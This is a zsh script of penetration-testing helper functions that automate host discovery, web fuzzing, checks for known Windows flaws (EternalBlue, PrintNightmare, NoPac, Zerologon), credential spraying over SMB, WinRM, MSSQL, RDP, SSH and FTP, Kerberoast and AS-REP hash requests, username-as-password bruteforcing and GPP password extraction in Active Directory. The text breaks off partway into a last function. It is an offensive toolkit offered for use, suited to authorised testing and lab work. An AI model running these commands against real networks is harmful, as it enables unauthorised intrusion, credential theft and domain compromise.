#!/bin/zsh
# Scripts to run a bunch of tools sequentially and automate a lot of the mindless, repetitive process of enumeration.
# Permission to copy and modify is granted under the MIT license. :))

# NETSCAN
# Runs fping on the network to make a list of live hosts. 
# The list then gets passed onto nmap to scan the machines further for open ports and services. 
#------------------------------------------------------------------------------------
# Usage: netscan [-F] 172.0.0.1/24
netscan() {
    echo '
              |  \033[1;33m   __|   __|    \     \ | \033[0m
    \    -_)   _|\033[1;33m \__ \  (      _ \   .  | \033[0m
 _| _| \___| \__|\033[1;33m ____/ \___| _/  _\ _|\_|  \033[0m                                      
'

    
    if [ $# -eq 0 ]; then
        echo -e "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 <IP/CIDR Range>"
        return 1
    fi

    # Define IP and CIDR patterns
    local cidr_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2][0-9]|3[0-2])$'
    local ip_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$'
    local input="$1"

    # Validate input
    if ! [[ "$input" =~ $cidr_pattern ]] && ! [[ "$input" =~ $ip_pattern ]] && ! [[ -f "$input" ]]; then
        echo -e "\033[1;31m[!] \"$input\" is not a valid file, IP or CIDR range. \033[0m"
        echo "Usage: $0 <IP/CIDR Range/Targets file>"
        return 1
    fi
    

    # Check for required tools
    if ! command -v fping > /dev/null || ! command -v nmap > /dev/null; then
        echo -e "\033[1;31m[!] Required tools (fping, nmap) are not installed. \033[0m"
        return 1
    fi

    # Set a trap to clean up temporary files on exit
    trap "echo ''" INT
    
    # Host Discovery
    if [[ -f "$input" ]]; then
        # Targets file
        cp "$input" scan_targets.tmp
    elif [[ "$input" =~ $cidr_pattern ]]; then
        # Host discovery using fping
        echo -e "\033[1;35m[!] Running fping on the $input network\033[0m"
        echo -e "\033[0;34m[>] fping -agq "$input" \033[0m"
        fping -agq "$input" | tee scan_targets.tmp
        cat scan_targets.tmp >> hosts.txt && dedup hosts.txt        
        echo '\033[0;34m[*] Saving enumerated hosts to ./hosts.txt \033[0m'
        ## Optionally, use nmap for discovery 
        # echo -e "\033[1;35m[!] Scanning $input for live hosts using nmap\033[0m"
        # echo -e "\033[0;34m[>] nmap -sn "$input" -T4 --min-rate 10000 \033[0m"
        # nmap -sn "$input" -T4 --min-rate 10000 -oG - | awk '/Up$/{print $2}' | tee scan_targets.tmp
        #cat scan_targets.tmp >> hosts.txt && dedup hosts.txt        
        #echo '\033[0;34m[*] Saving enumerated hosts to ./hosts.txt \033[0m'
    elif [[ "$input" =~ $ip_pattern ]]; then
        # Single IP
        echo "$input" > scan_targets.tmp
    fi

    # Check for empty results
    if ! grep -q '[^[:space:]]' scan_targets.tmp; then
        echo -e "\033[1;31m[!] Empty results. Maybe you got the syntax wrong? \033[0m"
        rm -f scan_targets.tmp
        return 1
    fi

    # Scanning function
    echo '\033[1;35m[!] Running FAST TCP SCAN on known live hosts\033[0m'    
    echo "\033[0;34m[>] nmap -T4 -Pn -F --min-rate 10000 \033[0m"
      while read item
        do
          echo "\033[0;36m[*] Scanning $item...\033[0m"
          nmap -T4 -Pn -F --min-rate 10000 "$item" | sed -n '/PORT/,$p' | sed -n '/Nmap done/q;p' | grep --color=never -v '^[[:space:]]*$'
          #echo ""
        done < scan_targets.tmp
    if [[ fast -eq 1 ]]; then
      return 0
    else
      echo '\033[1;35m[!] Running FULL TCP SCAN on known live hosts\033[0m'    
      echo "\033[0;34m[>] nmap -T4 -Pn -sVC -p- --min-rate 10000 -vv \033[0m"
      while read item
        do
          echo "\033[0;36m[*] Scanning $item...\033[0m"
        #   nmap -T4 -Pn -sVC -p- "$item" --min-rate 10000 -vv 2>/dev/null | sed -n '/PORT/,$p' | sed -n '/Script Post-scanning/q;p' | grep --color=never -v '^[[:space:]]*$' | color green "[0-9]*\/tcp .*|Service Info.*"
          nmap -T4 -Pn -sVC -p- "$item" --min-rate 10000 -vv 2>/dev/null | sed -n '/PORT/,$p' | sed -n '/Script Post-scanning/q;p' | grep --color=never -v '^[[:space:]]*$' | color yellow "^\|.*"

          #echo ""
        done < scan_targets.tmp
      echo '\033[1;35m[!] Running UDP SCAN on known live hosts\033[0m'    
      echo "\033[0;34m[>] nmap -T4 -sU --open --min-rate 10000 \033[0m"
      while read item
        do
          echo "\033[0;36m[*] Scanning $item...\033[0m"
          nmap -T4 -sU --open --min-rate 10000 "$item" | sed -n '/PORT/,$p' | sed -n '/Nmap done/q;p' | grep --color=never -v '^[[:space:]]*$'
          #echo ""
        done < scan_targets.tmp
    fi

    rm -f *.tmp
    trap - INT EXIT
    echo -e "\033[1;31m[*] Done. \033[0m"
}


# WEBSCAN
# Runs fping on the network to find live hosts and outputs their IPs to scan_targets.tmp. 
# The list then gets passed onto NetExec to enumerate the machines further and get the hosts and domain names. 
# Lastly, it adds the DC’s IP and domain name to /etc/hosts to make our lives easier.
#------------------------------------------------------------------------------------
# Usage: webscan <IP/URL>
webscan() {
    echo '
                |    \033[1;33m  __|   __|    \     \ | \033[0m
 \ \  \ /  -_)   _ \ \033[1;33m\__ \  (      _ \   .  | \033[0m
  \_/\_/ \___| _.__/ \033[1;33m____/ \___| _/  _\ _|\_| \033[0m                                                                                 
'  

    if [[ $# -eq 0 ]]; then
        echo -e "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 <http://site.com> [-w/--wordlist <wordlist>]"
        return 1
    fi

    # Default variables
    local url=""
    local weblist="/usr/share/seclists/Discovery/weblist-chsoares.txt"  # Default wordlist

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -w|--wordlist)
                weblist="$2"
                shift 2
                ;;
            *)
                url="$1"
                shift
                ;;
        esac
    done

    # Validate URL
    if [[ -z "$url" || ! "$url" =~ ^https?:// ]]; then
        echo -e "\033[1;31m[!] Invalid or missing URL. Please include 'http://' or 'https://'. \033[0m"
        echo "Usage: $0 <http://site.com> [-w/--wordlist <wordlist>]"
        return 1
    fi

    # Validate wordlist
    if [[ ! -f "$weblist" ]]; then
        echo -e "\033[1;31m[!] Wordlist not found: $weblist \033[0m"
        return 1
    fi

    # Check for required tools
    for tool in whatweb ffuf; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "\033[1;31m[!] Required tool not found: $tool \033[0m"
            return 1
        fi
    done

    # Detect if target is IP or domain
    local host=$(echo "$url" | sed 's|https*://||' | cut -d'/' -f1)
    local is_ip=0
    if [[ "$host" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        is_ip=1
    fi

    # Parse domain and TLD (only if not IP)
    local domain=""
    local tld=""
    if [[ $is_ip -eq 0 ]]; then
        domain=$(echo "$host" | cut -d '.' -f 1)
        tld=$(echo "$host" | cut -d '.' -f 2)
    fi

    trap "echo ''" INT

    # Run WhatWeb
    echo -e "\033[1;35m[!] Running WhatWeb on $url \033[0m"
    echo -e "\033[0;34m[>] whatweb -a3 -v $url \033[0m"
    echo ""
    whatweb -a3 -v "$url"
    echo ""

    # Directory Fuzzing
    echo -e "\033[1;35m[!] Fuzzing for directories \033[0m"
    echo -e "\033[0;34m[>] ffuf -u $url/FUZZ -w $weblist -c -t 250 -ic -ac -v \033[0m"
    echo ""
    ffuf -u "$url/FUZZ" -w "$weblist" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "FUZZ:|-->"
    echo ""

    if [[ $is_ip -eq 0 ]]; then
        # Subdomain Fuzzing
        echo -e "\033[1;35m[!] Fuzzing for subdomains \033[0m"
        echo -e "\033[0;34m[>] ffuf -u $url -w $weblist -H \"Host: FUZZ.$domain.$tld\" -c -t 250 -ic -ac -v \033[0m"
        echo ""
        ffuf -u "$url" -w "$weblist" -H "Host: FUZZ.$domain.$tld" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "URL|-->"
        echo -e "\033[0;36m[*] Remember to add any discovered subdomain to /etc/hosts :) \033[0m"
        echo ""

        # Virtual Host Fuzzing
        echo -e "\033[1;35m[!] Fuzzing for vhosts \033[0m"
        echo -e "\033[0;34m[>] ffuf -u $url -w $weblist -H \"Host: FUZZ.$tld\" -c -t 250 -ic -ac -v \033[0m"
        echo ""
        ffuf -u "$url" -w "$weblist" -H "Host: FUZZ.$tld" -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "URL|-->"
        echo ""
    else
        echo -e "\033[1;33m[!] Target is an IP. Skipping subdomain and vhost fuzzing. \033[0m"
        echo ""
    fi

    # Recursive Fuzzing for Common Extensions
    echo -e "\033[1;35m[!] Fuzzing recursively for common file extensions (this might take long!) \033[0m"
    echo -e "\033[0;34m[>] ffuf -u $url/FUZZ -w $weblist -recursion -recursion-depth 1 -e .php,.aspx,.txt,.html -c -t 250 -ic -ac -v \033[0m"
    echo ""
    ffuf -u "$url/FUZZ" -w "$weblist" -recursion -recursion-depth 1 -e .php,.aspx,.txt,.html -c -t 250 -ic -ac -v 2>/dev/null | grep -vE "FUZZ:|-->"
    echo ""

    trap - INT
    echo -e "\033[1;31m[*] Done. \033[0m"
}

# checkvulns
#------------------------------------------------------------------------------------
#Usage: checkvulns -t target -u user [-p password] [-H hash] [-k]
checkvulns() {
    if [[ $# -eq 0 ]]; then
        echo -e "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 -t target|-t targets.txt -u user [-p password] [-H hash] [-k]"
        return 1
    fi

    # Parse -t argument to check if it's a file
    local target_file=""
    local target_arg=""
    local pass_args=()
    local single_mode=0

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t|--target)
                if [[ -f "$2" && "$2" == *.txt ]]; then
                    target_file="$2"
                else
                    target_arg="$2"
                fi
                pass_args+=("$1" "$2")
                shift
                ;;
            --single)
                single_mode=1
                ;;
            *)
                pass_args+=("$1")
                ;;
        esac
        shift
    done

    # Se for arquivo de targets, faz loop
    if [[ -n "$target_file" && $single_mode -eq 0 ]]; then
        while IFS= read -r tgt || [[ -n "$tgt" ]]; do
            [[ -z "$tgt" ]] && continue
            # Monta os argumentos para o alvo individual
            new_args=()
            for arg in "${pass_args[@]}"; do
                if [[ "$arg" == "$target_file" ]]; then
                    new_args+=("$tgt")
                else
                    new_args+=("$arg")
                fi
            done
            # Chama recursivamente, mas agora em modo single
            checkvulns -t "$tgt" "${new_args[@]/--single}" --single
        done < "$target_file"
        echo -e "\033[1;31m[*] Done. \033[0m"
        return
    fi

    # Execução normal para um alvo só
    get_auth "${pass_args[@]}"
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi

    echo -e "\033[1;35m[!] Checking for vulnerabilities on $target_arg \033[0m"

    # Teste rápido de conexão SMB
    smb_test_output=$(nxc smb "${nxc_auth[@]}")
    smb_success=$(echo "$smb_test_output" | grep -a "SMB" | grep  -a -F '[+]')

    if [[ -z "$smb_success" ]]; then
        echo -e "\033[0;33m[*] SMB connection failed or invalid credentials. Skipping. \033[0m"
        if [[ $single_mode -eq 0 ]]; then
            echo -e "\033[1;31m[*] Done. \033[0m"
        fi
        return
    fi

    echo -e '\033[0;34m[*] EternalBlue (MS17-010) \033[0m'
    nxc smb "${nxc_auth[@]}" -M ms17-010 | grep -a MS17-010 | tr -s " " | cut -d " " -f 3-

    echo -e '\033[0;34m[*] PrintNightmare (CVE-2021-34527) \033[0m'
    nxc smb "${nxc_auth[@]}" -M printnightmare | grep -a PRINTNIGHTMARE | tr -s " " | cut -d " " -f 5- | grep -v "STATUS_ACCESS_DENIED"

    echo -e '\033[0;34m[*] NoPac (CVE-2021-42278) \033[0m'
    nxc smb "${nxc_auth[@]}" -M nopac | grep -a NOPAC | tr -s " " | cut -d " " -f 5- | tr -s '\n'

    echo -e '\033[0;34m[*] Coerce Attacks (CVE-2021-36942 / etc) \033[0m'
    nxc smb "${nxc_auth[@]}" -M coerce_plus | grep -a COERCE | tr -s " " | cut -d " " -f 5- | tee coerce.tmp
    if grep -q "VULNERABLE" coerce.tmp; then
      echo "Try: nxc smb ${nxc_auth[*]} -M coerce_plus -o LISTENER=\$kali"
    fi
    rm coerce.tmp 2>/dev/null

    echo -e '\033[0;34m[*] Zerologon (CVE-2020-1472) \033[0m'
    nxc smb "${nxc_auth[@]}" -M zerologon | grep -a ZEROLOGON | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g' | grep -v "DCERPCException"

    trap - INT
    if [[ $single_mode -eq 0 ]]; then
        echo -e "\033[1;31m[*] Done. \033[0m"
    fi
}


# ADSCAN
# Runs fping on the network to find live hosts and outputs their IPs to scan_targets.tmp. 
# The list then gets passed onto NetExec to enumerate the machines further and get the hosts and domain names. 
# Lastly, it adds the DC’s IP and domain name to /etc/hosts to make our lives easier.
#------------------------------------------------------------------------------------
# Usage: adscan 172.0.0.1/24
adscan() {

    echo '
             |\033[1;33m   __|   __|    \     \ | \033[0m
   _` |   _` |\033[1;33m \__ \  (      _ \   .  | \033[0m
 \__,_| \__,_|\033[1;33m ____/ \___| _/  _\ _|\_| \033[0m                                      
'  

      
    if [[ $# -eq 0 ]]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 <CIDR Range>"
        return 1
    fi
    
    # Define IP and CIDR patterns
    local cidr_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2][0-9]|3[0-2])$'
    local ip_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$'
    local input="$1"

    # Validate input
    if ! [[ "$input" =~ $cidr_pattern ]] && ! [[ "$input" =~ $ip_pattern ]] && ! [[ -f "$input" ]]; then
        echo -e "\033[1;31m[!] \"$input\" is not a valid file, IP or CIDR range. \033[0m"
        echo "Usage: $0 <IP/CIDR Range/Targets file>"
        return 1
    fi

    # Host Discovery
    if [[ -f "$input" ]]; then
        # Targets file
        cp "$input" scan_targets.tmp
    elif [[ "$input" =~ $cidr_pattern ]]; then
        # Host discovery using fping
        echo -e "\033[1;35m[!] Running fping on the $input network\033[0m"
        echo -e "\033[0;34m[>] fping -agq "$input" \033[0m"
        fping -agq "$input" | tee scan_targets.tmp
        cat scan_targets.tmp >> hosts.txt && dedup hosts.txt        
        echo '\033[0;34m[*] Saving enumerated hosts to ./hosts.txt \033[0m'
        ## Optionally, use nmap for discovery 
        # echo -e "\033[1;35m[!] Scanning $input for live hosts using nmap\033[0m"
        # echo -e "\033[0;34m[>] nmap -sn "$input" -T4 --min-rate 10000 \033[0m"
        # nmap -sn "$input" -T4 --min-rate 10000 -oG - | awk '/Up$/{print $2}' | tee scan_targets.tmp
        #cat scan_targets.tmp >> hosts.txt && dedup hosts.txt        
        #echo '\033[0;34m[*] Saving enumerated hosts to ./hosts.txt \033[0m'
    elif [[ "$input" =~ $ip_pattern ]]; then
        # Single IP
        echo "$input" > scan_targets.tmp
    fi

    # Run NetExec
    echo -e '\033[1;35m[!] Running NetExec on known live hosts \033[0m'
    nxc smb scan_targets.tmp > nxc.tmp

    if [[ $? -ne 0 || ! -s nxc.tmp ]]; then
        echo -e "\033[1;31m[!] NetExec failed or returned no results. \033[0m"
        return 1
    else
        cat nxc.tmp | tr -s " "
    fi

    local hosts_count=$(cat nxc.tmp | head -n -1 | wc -l)

    # Sanitize ANSI escape codes and prepare clean version
    sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' nxc.tmp > nxc.clean

    echo -e "\033[1;36m[?] Add discovered hosts to /etc/hosts? [y/N] \033[0m"
    read -s -q confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
    
while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    [[ "$line" =~ ^SMB ]] || continue

    ip=$(awk '{for(i=1;i<=NF;i++) if ($i ~ /([0-9]{1,3}\.){3}[0-9]{1,3}/) {print $i; break}}' <<< "$line")
    hostname=$(sed -n 's/.*(name:\([^)]*\)).*/\1/p' <<< "$line" | tr -d '\r\n\t ' | tr -cd '[:print:]')
    domain_name=$(sed -n 's/.*(domain:\([^)]*\)).*/\1/p' <<< "$line" | tr -d '\r\n\t ' | tr -cd '[:print:]')
    is_dc=$(awk 'BEGIN{IGNORECASE=1} /DC/ {print 1}' <<< "$line")

    if [[ -n "$domain_name" ]]; then
        if [[ $is_dc -eq 1 || $hosts_count -eq 1 ]]; then
            new_entry="$ip    DC $hostname $hostname.$domain_name $domain_name"
            zshenv add domain=$domain
        else
            new_entry="$ip    $hostname $hostname.$domain_name"
        fi
    else
        new_entry="$ip    $hostname"
    fi

    if ! grep -q -F "$ip" /etc/hosts; then
        echo "$new_entry" | tee -a /etc/hosts
    fi
done < nxc.clean
       
        echo -e "\033[0;34m[*] New hosts added to /etc/hosts successfully. \033[0m"
        echo -e "\033[0;36m[*]\033[0m \033[0;33m\$domain \033[0mis set to $domain \033[0m"
    fi 
    
    # Clean up temporary files
    rm -f nxc.tmp nxc.clean scan_targets.tmp 2>/dev/null
    trap - INT
    echo -e "\033[1;31m[*] Done. \033[0m"
}


# TESTCREDS
# Runs NetExec with given credentials against SMB / WinRM / MSSQL / RDP / SSH so we can test the account’s potential
#------------------------------------------------------------------------------------
# Usage: testcreds -u user [-p password] [-H hash] [-k] [--ips ips.list]
testcreds() {

    echo '  
  |               |  \033[1;33m   __|  _ \  __|  _ \    __| \033[0m
   _|   -_) (_-<   _|\033[1;33m  (       /  _|   |  | \__ \ \033[0m
 \__| \___| ___/ \__|\033[1;33m \___| _|_\ ___| ___/  ____/ \033[0m
'                                               
    
    if [ $# -eq 0 ]; then
        echo -e "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 -t target [-f file] [-u user] [-p password] [-H hash] [-k]"
        exit 1
    fi

    # Cria arquivo temporário único
    auth_tmp=$(mktemp /tmp/auth.XXXXXX)

    # Set a trap to clean up temporary files on exit
    trap "rm -f '$auth_tmp'; echo ''" INT

    if [[ $3 == "-f" ]]; then
        file=$4
        while IFS= read -r line || [ -n "$line" ]; do
            if [ -z "$line" ]; then
                continue
            fi
            user=$(echo "$line" | cut -d: -f1)
            pass=$(echo "$line" | cut -d: -f2)
            if [[ $pass =~ ^[a-fA-F0-9]{32}$ ]]; then
                echo "-t $2 -u $user -H $pass" >> "$auth_tmp"
            else
                echo "-t $2 -u $user -p $pass" >> "$auth_tmp"
            fi
        done < "$file"
    else
        echo "$@" > "$auth_tmp"
    fi

    while IFS= read -r line || [ -n "$line" ]; do
        if [ -z "$line" ]; then
            continue
        fi

        # Use eval to split $line into separate arguments
        eval get_auth $line

        echo -e "\033[1;35m[!] Testing $user's credentials with NetExec\033[0m"
        echo -e "\033[0;34m[>] nxc xxx "${nxc_auth[@]}" \033[0m"
        
        echo -e '\033[0;34m[*] Trying SMB... \033[0m'
        nxc smb "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
        nxc smb "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
        
        echo -e '\033[0;34m[*] Trying WinRM... \033[0m'
        nxc winrm "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
        nxc winrm "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "

        echo -e '\033[0;34m[*] Trying MS-SQL... \033[0m'
        nxc mssql "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
        nxc mssql "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "

        echo -e '\033[0;34m[*] Trying RDP... \033[0m'
        nxc rdp "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
        nxc rdp "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "

        echo -e '\033[0;34m[*] Trying SSH... \033[0m'
        nxc ssh "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
        
        echo -e '\033[0;34m[*] Trying FTP... \033[0m'
        nxc ftp "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
        
    done < "$auth_tmp"

    rm -f "$auth_tmp" 2>/dev/null
    trap - INT
    echo -e "\033[1;31m[*] Done. \033[0m"
}


# ENUMDOMAIN
# Takes a target Domain Controller and optionally (preferably!) a set of credentials 
# and runs a bunch of NetExec and Impacket scripts sequentially to extract some juicy information about the domain.
#------------------------------------------------------------------------------------
#Usage: enumdomain -t target -u user [-p password] [-H hash] [-k]
enumdomain() {
    echo '   
                           \033[1;33m  _ \   _ \   \  |    \   _ _|   \ | \033[0m
     -_)    \   |  |   ` \ \033[1;33m  |  | (   | |\/ |   _ \    |   .  | \033[0m
   \___| _| _| \_,_| _|_|_|\033[1;33m ___/ \___/ _|  _| _/  _\ ___| _|\_| \033[0m
'                                                               
    if [[ $# -eq 0 ]]; then
        echo "\033[1;31m[!] Missing parameters. \033[0m"
        echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi     
    
    get_auth $@ 
    if [[ $? -eq 2 ]]; then
        echo "Usage: $0 -t target -u user [-p password] [-H hash] [-k]"
        return 1
    fi    
       
    #debug
    #echo "nxc = $nxc_auth"
    #echo "imp = $imp_auth"
    #end debug    

    # Set a trap to clean up temporary files on exit
    trap "echo ''" INT
    
    echo -e "\033[1;37m[\033[1;35m+\033[1;37m] Starting user & group enumeration... \033[0m"

    echo -e "\033[1;36m[?] Bruteforce RIDs? [y/N]\033[0m"
    read -s -q confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then
        echo -e "\033[1;35m[!] Enumerating all users with RID Bruteforcing \033[0m"
        echo -e "\033[0;34m[>] nxc smb "${nxc_auth[@]}" --rid-brute 5000 \033[0m"
        nxc smb "${nxc_auth[@]}" --rid-brute 5000 2>/dev/null | grep SidTypeUser | cut -d ':' -f2 | cut -d '\' -f2 | cut -d ' ' -f1 | tee users.tmp
        if [ -s users.tmp ]; then
            mv users.tmp users.list
            echo -e "\033[0;34m[*] Saving enumerated users to ./users.list \033[0m"
        else
            echo -e "\033[1;31m[!] No users found during RID Bruteforcing. Check for errors. \033[0m"
            rm -f users.tmp
        fi
    fi
    
    echo "\033[1;35m[!] Enumerating groups \033[0m"
    echo "\033[0;34m[>] nxc smb "${nxc_auth[@]}" --groups \033[0m"
    nxc smb "${nxc_auth[@]}" --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"   
        
    
    echo "\033[1;35m[!] Enumerating privileged users \033[0m"
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" --admin-count \033[0m"
    nxc ldap "${nxc_auth[@]}" --admin-count 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5
    
    echo "\033[1;35m[!] Enumerating user descriptions \033[0m"
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M user-desc \033[0m"
    nxc ldap "${nxc_auth[@]}" -M user-desc 2>/dev/null | grep --color=never -o "User:.*"
    
    echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Looking for exploitable accounts... \033[0m"

    echo "\033[1;35m[!] Searching for AS-REProastable users \033[0m"
    echo "\033[0;34m[>] GetNPUsers.py $(echo "$imp_auth") -request \033[0m"
    GetNPUsers.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
    GetNPUsers.py $(echo "$imp_auth") -request -outputfile asrep.hash >/dev/null 2>&1
    if [ -f ./asrep.hash ]; then
        echo -e '\033[0;34m[*] Saving hashes to ./asrep.hash \033[0m'
    fi
    
    echo "\033[1;35m[!] Searching for Kerberoastable users \033[0m"
    echo "\033[0;34m[>] GetUserSPNs.py $(echo "$imp_auth") -request \033[0m"
    GetUserSPNs.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
    GetUserSPNs.py $(echo "$imp_auth") -request -outputfile kerb.hash >/dev/null 2>&1
    if [ -f ./kerb.hash ]; then
        echo -e '\033[0;34m[*] Saving hashes to ./kerb.hash \033[0m'
    fi
    echo "\033[1;35m[!] Searching for PASSWD_NOTREQD flag \033[0m" 
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" --password-not-required \033[0m"
    nxc ldap "${nxc_auth[@]}" --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"
    
    echo "\033[1;35m[!] Searching for pre-Win2k computer accounts\033[0m"
    echo "\033[0;34m[>] pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list \033[0m"
    pre2k unauth -d $domain -dc-ip $dc_ip -inputfile users.list 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never

    echo -e "\033[1;36m[?] Bruteforce all users with username as password? [y/N]\033[0m"
    read -s -q confirm
    if [[ $confirm =~ ^[Yy]$ ]]; then
        if [ -f users.list ]; then
            echo -e "\033[1;35m[!] Starting username-password bruteforce for users in ./users.list \033[0m"
            while read target; do
                nxc smb $ip -u $target -p $target 2>/dev/null | grep + | tr -s " " | cut -d " " -f 6
            done < users.list
        else
            echo -e "\033[1;31m[!] File 'users.list' not found. Skipping. \033[0m"
        fi
    fi
    
    echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Looking for interesting domain configuration and services... \033[0m"

    echo "\033[1;35m[!] Searching for PKI Enrollment Services \033[0m"
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M adcs \033[0m"
    nxc ldap "${nxc_auth[@]}" -M adcs 2>/dev/null | grep ADCS | tr -s " " | cut -d ' ' -f 6-
    
    echo "\033[1;35m[!] Enumerating trust relationships \033[0m"
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M enum_trusts \033[0m"
    nxc ldap "${nxc_auth[@]}" -M enum_trusts 2>/dev/null | grep ENUM_TRUSTS | tr -s " " | cut -d ' ' -f 6-
    
    echo "\033[1;35m[!] Enumerating MachineAccountQuota \033[0m"
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}" -M maq \033[0m"
    nxc ldap "${nxc_auth[@]}" -M maq 2>/dev/null | grep -oE "MachineAccountQuota: .*" --color=never
    
    echo "\033[1;35m[!] Enumerating delegation rights \033[0m"
    echo "\033[0;34m[>] findDelegation.py $(echo "$imp_auth") \033[0m"
    findDelegation.py $(echo "$imp_auth") 2>/dev/null | grep --color=never "\S" | tail -n +2
    
    echo "\033[1;35m[!] Enumerating DCSync rights \033[0m"  
    local domain1=$(echo $domain | cut -d '.' -f 1)
    local domain2=$(echo $domain | cut -d '.' -f 2)
    echo "\033[0;34m[>] nxc ldap "${nxc_auth[@]}"  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync \033[0m"
    nxc ldap "${nxc_auth[@]}"  -M daclread -o TARGET_DN="DC=$domain1,DC=$domain2" ACTION=read RIGHTS=DCSync 2>/dev/null | grep "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//'
    
    echo "\033[1;35m[!] Searching for credentials in the GPO \033[0m"
    echo "\033[0;34m[>] nxc smb "${nxc_auth[@]}" -M gpp_password -M gpp_autologin \033[0m"
    nxc smb "${nxc_auth[@]}" -M gpp_password 2>/dev/null | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never
    nxc smb "${nxc_auth[@]}" -M gpp_autologin 2>/dev/null | grep -aioE "\Found credentials .*|Usernames: .*|Passwords: .*" --color=never
        
    echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Starting data collection... \033[0m"

echo -e "\033[1;36m[?] Ingest data for Bloodhound? [y/N] \033[0m"
read -s -q -t 60 confirm
if [[ $confirm =~ ^[Yy]$ ]]; then    
    echo -e "\033[1;35m[!] Ingesting AD data \033[0m"
    echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[*]} --bloodhound --collection All --dns-server $dc_ip \033[0m"

    # Executa o comando, suprime o output, mas captura o nome do arquivo zip
    zip_path=$(nxc ldap "${nxc_auth[@]}" --bloodhound --collection All --dns-server "$dc_ip" 2>/dev/null \
        | grep -oE '/[^ ]+_bloodhound\.zip' | tail -1)

    if [[ -n "$zip_path" && -f "$zip_path" ]]; then
        dest_zip="./${domain}_bloodhound.zip"
        mv "$zip_path" "$dest_zip"
        echo -e "\033[0;34m[*] Saving data to $dest_zip\033[0m"
    else
        echo -e "\033[1;31m[!] Could not find BloodHound zip output!\033[0m"
    fi
fi

    trap - INT
    echo "\n\033[1;31m[*] Done. \033[0m"
}

# ENUMUSER
# Follows the same idea of enumdomain, really. It runs a bunch of NetExec and Impacket scripts to enumerate user rights.
#------------------------------------------------------------------------------------
# #Usage: enumdomain -t target -u user [-p password] [-H hash] [-k]
enumuser() {
    echo '   
                           \033[1;33m  |  |   __|  __|  _ \ \033[0m
     -_)    \   |  |   ` \ \033[1;33m  |  | \__ \  _|     / \033[0m
